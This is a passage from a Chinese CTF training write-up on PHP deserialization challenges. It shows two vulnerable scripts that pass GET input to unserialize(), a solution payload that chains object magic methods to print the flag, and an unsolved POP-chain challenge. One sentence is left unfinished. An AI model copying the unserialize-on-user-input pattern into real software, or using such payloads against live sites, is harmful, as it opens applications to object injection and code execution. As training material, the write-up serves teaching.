## php

[PHP反序列化](https://ctf.xidian.edu.cn/training/11?challenge=1028)

打开容器看到：

```php
<?php
highlight_file(__FILE__);

class A {
    public function test() {
        echo getenv('FLAG');
    }
}

class B {
    public $c;

    public function __wakeup() {
        ($this->c)();
    }
}

if (isset($_GET['data'])) {
    $data = unserialize($_GET['data']);
}
```

???+ tips "php反序列化方法"
    > [参考链接](https://xz.aliyun.com/news/11953)

这题需要做的事是

最后在尾部加上`?data=O:1:"B":1:{s:1:"c";a:2:{i:0;O:1:"A":0:{}i:1;s:4:"test";}}`即可.

<center><img src="../figures/xdmoe/phptrick.png" style="zoom: 33%;"/></center>



[pop](https://ctf.xidian.edu.cn/training/11?challenge=1027)

```php
<?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $id = $this->id;
        ($this->name)->$id($this->age);
    }
}

class PersonB
{
    private $name;
    private $id;
    private $age;

    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        ($this->name)($age);
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```
